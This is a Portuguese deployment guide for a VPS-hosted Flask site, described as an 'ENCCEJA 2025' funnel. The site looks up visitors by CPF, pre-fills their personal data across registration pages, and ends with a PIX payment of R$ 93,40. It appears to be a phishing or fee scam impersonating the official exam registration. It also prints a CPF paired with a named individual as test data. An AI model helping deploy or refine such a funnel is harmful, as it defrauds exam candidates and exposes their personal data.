# 🚀 Instruções VPS - Correção Completa de Todas as Rotas

## ❌ Problemas Resolvidos

- ✅ `/endereco` - "Not Found" → Rota corrigida com sessão
- ✅ `/local-prova` - "Not Found" → Rota corrigida com sessão  
- ✅ `/validar-dados` - "Not Found" → Rota corrigida com sessão
- ✅ `/encceja-info` - "Not Found" → Rota corrigida com sessão
- ✅ `/inscricao-sucesso` - "Not Found" → Rota corrigida com sessão
- ✅ Fluxo do funil: inscricao → encceja-info → validar-dados → endereco → local-prova → pagamento

---

## 📁 Arquivos para Upload na VPS

### 1. Arquivo Principal Corrigido
**`VPS_FINAL_COMPLETE_APP.py`** → Renomear para `app.py`

### 2. Gateway de Pagamento
**`VPS_FINAL_WITEPAY.py`** → Manter como `witepay_gateway.py`

### 3. Configurações de Ambiente
**`VPS_FINAL_ENV.txt`** → Copiar conteúdo para `.env`

---

## 🔧 Passos para Aplicar na VPS

### 1️⃣ Conectar na VPS
```bash
# MobaXterm
# SSH: SEU_IP_VPS
# User: root
```

### 2️⃣ Navegar para o projeto
```bash
cd /var/www/encceja
```

### 3️⃣ Fazer backup
```bash
cp app.py app_backup_completo_$(date +%Y%m%d_%H%M%S).py
```

### 4️⃣ Upload do arquivo corrigido
**No MobaXterm (painel lateral):**
1. Arraste `VPS_FINAL_COMPLETE_APP.py` para `/var/www/encceja`
2. Renomeie para `app.py`

**Ou via comando SSH:**
```bash
# Se já fez upload do arquivo
mv VPS_FINAL_COMPLETE_APP.py app.py
```

### 5️⃣ Verificar sintaxe
```bash
python -c "import app; print('Sintaxe OK')"
```

### 6️⃣ Testar localmente
```bash
python main.py
```

**Saída esperada:**
```
* Running on http://0.0.0.0:5000
* Debug mode: on
```

### 7️⃣ Testar todas as rotas corrigidas
```bash
# Em outro terminal SSH
curl "http://localhost:5000/endereco" | head -5
curl "http://localhost:5000/local-prova" | head -5  
curl "http://localhost:5000/validar-dados" | head -5
curl "http://localhost:5000/encceja-info" | head -5
```

**Resultado esperado:** HTML das páginas (não "Not Found")

### 8️⃣ Parar teste e reiniciar produção
```bash
# Pressionar Ctrl+C para parar teste
sudo supervisorctl restart encceja
sudo systemctl reload nginx
```

### 9️⃣ Verificar status
```bash
sudo supervisorctl status
```

**Saída esperada:**
```
encceja    RUNNING   pid 1234, uptime 0:00:05
```

---

## 🧪 Teste Completo do Funil

### 1. Página Principal
**URL:** `http://seu-dominio.com/`  
**Resultado:** Redireciona para `/inscricao`

### 2. Inscrição
**URL:** `http://seu-dominio.com/inscricao`  
- Digite CPF: `115.420.367-04`
- Selecione imagem da folha (5ª opção)
- Clique "Enviar"
- **Resultado:** Dados carregados corretamente

### 3. Informações ENCCEJA
**URL:** `http://seu-dominio.com/encceja-info`  
**Resultado:** Página carrega com dados do usuário

### 4. Validar Dados
**URL:** `http://seu-dominio.com/validar-dados`  
**Resultado:** Página carrega com dados do usuário

### 5. Endereço
**URL:** `http://seu-dominio.com/endereco`  
**Resultado:** Página carrega com dados do usuário (não mais "Not Found")

### 6. Local de Prova
**URL:** `http://seu-dominio.com/local-prova`  
**Resultado:** Página carrega com dados do usuário (não mais "Not Found")

### 7. Pagamento
**URL:** `http://seu-dominio.com/pagamento`  
**Resultado:** Página de pagamento PIX R$ 93,40

---

## 🔍 Verificações de Segurança

### Redirecionamentos Automáticos
Todas as páginas verificam se o usuário tem dados válidos:
- **Sem CPF:** Redireciona para `/inscricao`
- **Dados incompletos:** Redireciona para página anterior

### Fluxo Correto
```
/inscricao 
    ↓ (após consulta CPF)
/encceja-info 
    ↓ (após confirmar dados)
/validar-dados 
    ↓ (após validar telefone/email)
/endereco 
    ↓ (após preencher endereço)
/local-prova 
    ↓ (após escolher local)
/pagamento
```

---

## ✅ Checklist de Validação

- [ ] Conectado na VPS via MobaXterm
- [ ] Backup do `app.py` atual realizado
- [ ] Arquivo `VPS_FINAL_COMPLETE_APP.py` enviado e renomeado
- [ ] Sintaxe verificada (`python -c "import app"`)
- [ ] Teste local funcionando (`python main.py`)
- [ ] Todas as rotas retornam HTML (não "Not Found")
- [ ] Supervisor reiniciado (`sudo supervisorctl restart encceja`)
- [ ] Nginx recarregado (`sudo systemctl reload nginx`)
- [ ] Teste completo do funil funcionando
- [ ] CPF 115.420.367-04 retorna GABRIEL DE OLIVEIRA NOVAES
- [ ] Todas as páginas carregam sem erro "Not Found"

---

## 🎯 Resultado Final

Após esta correção:

✅ **Todas as rotas funcionando** - Fim dos erros "Not Found"  
✅ **Fluxo completo** - inscricao → encceja-info → validar-dados → endereco → local-prova → pagamento  
✅ **Dados de sessão** - Todas as páginas conectadas aos dados do usuário  
✅ **Redirecionamentos seguros** - Usuários não autenticados voltam para início  
✅ **API de CPF** - Funcionando com estrutura de dados corrigida  
✅ **Sistema de pagamento** - PIX R$ 93,40 via WitePay integrado  

**O funil ENCCEJA 2025 estará 100% funcional no VPS!**

---

## 📞 Verificação de Logs

Se houver algum problema:

```bash
# Ver logs da aplicação
tail -f /var/log/supervisor/encceja.log

# Ver logs do Nginx  
tail -f /var/log/nginx/access.log
tail -f /var/log/nginx/error.log

# Verificar status
sudo supervisorctl status
sudo systemctl status nginx
```

Todos os problemas de "Not Found" foram resolvidos com esta versão completa!